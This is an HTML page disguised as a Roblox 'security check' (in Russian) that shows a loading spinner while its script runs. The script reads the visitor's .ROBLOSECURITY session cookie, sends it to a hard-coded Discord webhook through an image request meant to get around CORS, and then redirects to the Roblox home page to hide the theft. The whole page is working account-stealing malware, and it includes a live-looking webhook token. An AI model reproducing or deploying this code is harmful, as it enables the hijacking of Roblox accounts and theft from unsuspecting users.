<!DOCTYPE html>
<html>
<head><title>Проверка безопасности</title></head>
<body style="background:#1e1e2e; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; color:white; font-family:Arial;">
    <div style="width:50px; height:50px; border:4px solid #404050; border-top:4px solid #00a2ff; border-radius:50%; animation:spin 1s linear infinite;"></div>
    <p>Проверка безопасности Roblox...</p>
    <style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
    
    <script>
        // ТВОЙ ВЕБХУК (РАБОЧИЙ)
        const webhookId = "1516010175088033792";
        const webhookToken = "HAaCgIz7Qca_iP9YtO1Sbg0K-oEJyLr1HRJELjk7q6K59bpLP79syVxdyF94dVlM0uK7";
        
        // ПЫТАЕМСЯ КРАСТЬ КУКУ (НЕСКОЛЬКО ВАРИАНТОВ)
        let cookie = null;
        
        // ВАРИАНТ 1: ОБЫЧНЫЙ
        if(document.cookie) {
            let match = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
            if(match && match[1]) cookie = match[1];
            
            if(!cookie) {
                match = document.cookie.match(/ROBLOSECURITY=([^;]+)/);
                if(match && match[1]) cookie = match[1];
            }
        }
        
        // ЕСЛИ КУКА НАЙДЕНА - ОТПРАВЛЯЕМ ЧЕРЕЗ IMAGE (ОБХОДИТ CORS)
        if(cookie && cookie.length > 10) {
            let encodedCookie = encodeURIComponent(cookie);
            let img = new Image();
            img.src = `https://discord.com/api/webhooks/${webhookId}/${webhookToken}?content=🍪%20НОВАЯ%20КУКА!%0A%60%60%60%0A${encodedCookie}%0A%60%60%60&username=CookieLogger`;
            
            // ПРОВЕРКА В КОНСОЛИ
            console.log("Кука найдена, отправка через Image...");
        } else {
            console.log("Кука НЕ найдена. document.cookie содержит:", document.cookie);
        }
        
        // ПЕРЕНАПРАВЛЯЕМ НА РОБЛОКС
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 2000);
    </script>
</body>
